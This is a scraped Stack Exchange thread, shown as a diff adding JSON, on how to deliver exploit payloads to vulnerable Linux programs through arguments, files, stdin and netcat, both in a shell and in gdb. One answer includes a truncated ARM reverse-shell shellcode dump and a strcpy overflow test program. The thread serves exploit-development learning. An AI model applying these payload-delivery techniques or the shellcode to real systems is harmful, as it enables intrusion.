@@ -1,0 +1,66 @@
+{
+  "title": "Managing inputs for payload injection?",
+  "link": "https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection",
+  "content": "I am looking for a complete list of the ways to inject a payload in a vulnerable program in a Unix (Linux) context depending on the inputs opened by the program.\n\nI know that there are several tricks and tips but an exhaustive list would definitely help here.\n\n",
+  "votes": "20",
+  "answers": 2,
+  "views": "38k",
+  "tags": [
+    "linux",
+    "exploit",
+    "binary"
+  ],
+  "user": "perror",
+  "time": "Nov 14, 2016 at 16:13",
+  "comments": [],
+  "answers_data": [
+    {
+      "content": "Injecting payload and hexadecimal addresses through program inputs depends on the type of input you get. Here is a list of all the possible inputs and the way to do it with both a pure shell environment and from within gdb.\n\nIn this case, the arguments are read from the initial command line, so the most convenient thing is:\n\n```\n$> ./program $(echo -ne \"\\xef\\xbe\\xad\\xde\")\n\n```\nIn gdb, you need to pass the arguments through the run command line like this:\n\n```\n(gdb) run $(echo -ne \"\\xef\\xbe\\xad\\xde\")\n\n```\nHere, you have no other choice but write in the file and then feed your program with this file like this:\n\n```\n$> ./program ./myfile.txt\n\n```\nAnd, within gdb, it should look like this:\n\n```\n(gdb) run myfile.txt\n\n```\nThen, outside of gdb you can rewrite the content of the file and run your program again and again in gdb.\n\nGetting the input through stdin can be achieve through a wide variety of functions such as fgets(), scanf(), getline(), read() and others. It raises a few problems because the program stop while executing and wait to be fed with characters. And, you would prefer to just have one feed at the beginning to try your stuff and see the result. Let see how to deal with this input.\n\nIn case you have to deal with several inputs (eg login, password, ...), you need to use separators between the inputs. Usually the separator between each input is just a newline character (  \n or \\r depending on the system you are in).\n\nNow, you have two ways of doing to feed the stdin. Either you go through a file, like this:\n\n```\n$> cat ./mycommands.txt | ./program\n\n```\nThe stdin requires to run the command either through a file like this:\n\n```\n(gdb) run < ./mycommands.txt\n\n```\nAnd do as said in the previous case.\n\nThe other option is to pipe the output of a command to the stdin of the program like this:\n\n```\n$> echo -ne \"\\xef\\xbe\\xad\\xde\" | ./program\n\n```\nIn gdb you can use the bash process substitution <(cmd) trick:\n\n```\n(gdb) run < <(echo -ne \"\\xef\\xbe\\xad\\xde\")\n\n```\nThis way is much quicker than effectively creating a named pipe and branch your program on it as recommended on several websites. Creating the named pipe outside of gdb requires a lot of unnecessary steps where you have it instantly with the previous technique.\n\nNote also that, some people are using <<$(cmd) like this:\n\n```\n(gdb) run <<< $(echo -ne \"\\xef\\xbe\\xad\\xde\")\n\n```\nBut, this last technique seems to filter out all NULL bytes (for whatever reason), so you should prefer the first one (especially if you want to pass NULL bytes).\n\nHere, you need to use another tool called netcat (the Swiss army knife of networking), often shortened into nc. Basically, if your vulnerable program is listening on localhost:666 then the command line would be:\n\n```\n$> echo -ne \"\\xef\\xbe\\xad\\xde\" | nc -vv localhost 666\n\n```\nWithin gdb, the point will be to run (r) the program and to connect to it from another terminal.\n\nMost of the techniques for stdin will send the exploit string to the program which will end shortly after the termination of the input. The best way to keep it open afterward and get an active shell is to add a cat waiting for input on its stdin. It should look like this if you go though a file:\n\n```\n$> (cat ./mycommands.txt; cat) | ./program\n\n```\nOr, like this if you want a shell command:\n\n```\n$> (echo -ne \"\\xef\\xbe\\xad\\xde\"; cat) | ./program\n\n```\nOr, finally, if you are going through the network:\n\n```\n$> (echo -ne \"\\xef\\xbe\\xad\\xde\"; cat) | nc -vv localhost 666\n\n```\nNote that I did not find how to do with gdb to keep the input open once the payload has been delivered.\n\nYou may have noticed that Python changed its way of handling raw bytes when going through the function print(). As an example you can have this kind of behavior (here is a comparison of the Python2 and Python3 behavior):\n\n```\n#> python2.7 -c 'print(\"\\xde\\xad\\xbe\\xef\")' | xxd\n00000000: dead beef 0a                                ....\n#> python3.9 -c 'print(\"\\xde\\xad\\xbe\\xef\")' | xxd\n00000000: c39e c2ad c2be c3af 0a                   .........\n\n```\nAs you noticed, in Python3, the output of print() is expressed in UTF-8 characters which change a lot the result of the command. This is not really convenient when you try to send a sequence of selected bytes to the program you attack.\n\nSo, if you are stuck with a system that offers nothing but a Python3 interpreter here is the command line to use:\n\n```\npython3.9 -c 'import sys; sys.stdout.buffer.write(b\"\\xde\\xad\\xbe\\xef\")' | xxd\n00000000: dead beef                                ....\n\n```\nYou may notice that the command in Python3 is quite more complex than the one in Python2 which somehow ruin a bit the simplicity of the original command. If someone has a shorter and simpler way to achieve this, please drop a comment to this article, I am really looking forward it!\n\nAn alternate way of doing it can use the echo command like that:\n\n```\n#> echo -ne \"\\xde\\xad\\xbe\\xef\" | xxd\n00000000: dead beef                                ....\n\n```\nBut, you cannot use the usual Python syntax such as \"\\x90\" * 12 + \"\\xde\\xad\\xbe\\xef\" which can be annoying if you want to look for the proper padding.\n\n",
+      "votes": "31",
+      "user": "perror",
+      "time": "Sep 24, 2021 at 13:53",
+      "is_accepted": true,
+      "comments": [
+        {
+          "user": "TruckerCat",
+          "text": "Thank you, this was really helpful for me. I looked for a way to pass shell code to a function like fgetc.  First I got  /bin/bash: warning: here-document at line 0 delimited by end-of-file (wanted python), when using (gdb) r < <(python exploit.py). To resolve this I removed spaces from the end of my python script, as suggested in this answer  stackoverflow.com/questions/18660798/…. Now it works  :-)",
+          "time": null
+        },
+        {
+          "user": "iMil",
+          "text": "[...]this last technique seems to filter out all NULL bytes (for whatever reason)[...]: using /bin/echo works in both cases, meaning it's built-in's gdb who's messing with \\x0's.",
+          "time": null
+        },
+        {
+          "user": "perror",
+          "text": "@iMil Indeed, I am using echo -ne by now... I should (and I will) update the article to refer about this. Thanks for mentioning it !",
+          "time": null
+        },
+        {
+          "user": "perror",
+          "text": "@iMil I finally took the time to change the article to echo only... Sorry for the long delay.",
+          "time": null
+        }
+      ]
+    },
+    {
+      "content": "Maybe my investigation will be helpful for somebody.\n\nBrief:\n\nI've prepare the reverse shellcode in assembler for ARM architecture (Raspberry Pi 1 B emulated in Qemu). When I start to test it I encounter few strange behaviours, which I would like to share.\n\nPreparation:\n\nOK, looks good for now\n\nGenerating the payload (hex dump):\n\n```\n   objcopy -O binary ReverseShell ReverseShell.bin\n\n```\n```\n   hexdump -v -e '\"\\\\\"\"x\" 1/1 \"%02x\" \"\"' ReverseShell.bin\n   \\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\x20\\x01\\x21\\x92\\x1a.....\n\n```\n```\n\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\xb9\\x1d\\xee\\xb6\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\x20\\x01\\x21\\x92\\x1a\\xc8\\x27\\x51\\x37\\x01\\xdf\\x04\\x1c\\x0a\\xa1\\x4a\\x70\\x10\\x22\\x02\\x37\\x01\\xdf\\x3f\\x27\\x20\\x1c\\x49\\x1a\\x01\\xdf\\x20\\x1c\\x01\\......\n\n```\nPassing the payload to the vulnerable program:\n\n```\n    #include <stdio.h>\n    #include <string.h>\n    \n    void func1(char *s)\n    {\n      char buffer[8];\n      strcpy(buffer, s);\n    }\n    \n    int main(int argc, char *argv[])\n    {\n      func1(argv[1]);\n      printf(\"Everything is fine.  \n\");\n    }\n\n```\nI run the gdb with argument as a payload like below:\n\n```\ngdb --args ./program $(python2.7 -c- 'print(\"\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\xb9\\x1d\\xee\\xb6\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\x20\\x01\\x21\\x92\\x1a\\xc8\\x27\\x51\\x37\\x01\\xdf\\x04\\x1c\\x0a\\xa1\\x4a\\x70\\x10\\x22\\x02\\x37\\x01\\xdf\\x3f\\x27\\x20\\x1c\\x49\\x1a\\x01\\xdf\\x20\\x1c\\...\")')\n\n```\nPut the breakpoint on the main and run. Still looks OK. I can put the breakpoint in the func1, just before returning from them:\n\n\n\nIn this point, the stack should already be overwritten and after  `pop', the program should branch to previously glued gadget address and start to execute the program from the previously \"prepared\" stack. Sooo let's have a look on the content of the stack:\n\n\nred digits:\n\n1 - ok, this is the filler 12 times 'A' character\n\n2 - the gadget address - still ok\n\n3 - the beginning of the payload\n\n4 - Ops, something went wrong, this part of payload should be:\n\nx13\\xff\\x2f\\xe1\\x02\\x20\\x01\\x21\n\nbut corresponding part of the memory is:\n\n0xe12fff13   0x21010002\n\nWhy in second word instead of 0x20 I have 0x00 ?\n\nOk, I've try to do this with python 3, but NULL will be there even with Python3.\nThis is only the one question. Did you encounter similar situation. What even more interesting, when I change the strcpy() to memcpy() in the func1(), and copy whole payload - 96 bytes, I have still 0 in this place. Am I lost something? I have no NULL's on the payload. Of course the session will crashed with segmentation fault, but I don't expect nothing different. As you can see, the number of NULL's is bigger, further in the memory dump, but no idea why.\n\n",
+      "votes": "1",
+      "user": "robi251",
+      "time": "Oct 25, 2022 at 10:32",
+      "is_accepted": false,
+      "comments": [
+        {
+          "user": "perror",
+          "text": "Python3 prints only UTF-8 outputs, so if it encounters some \\x20, it won't print the byte but the string \"\\x20\". Which is really irritating because python2 was working properly.",
+          "time": null
+        },
+        {
+          "user": "robi251",
+          "text": "Yes, you are right in case, when we are using Python3, but in abow example I'm using Python 2",
+          "time": null
+        }
+      ]
+    }
+  ]
+}
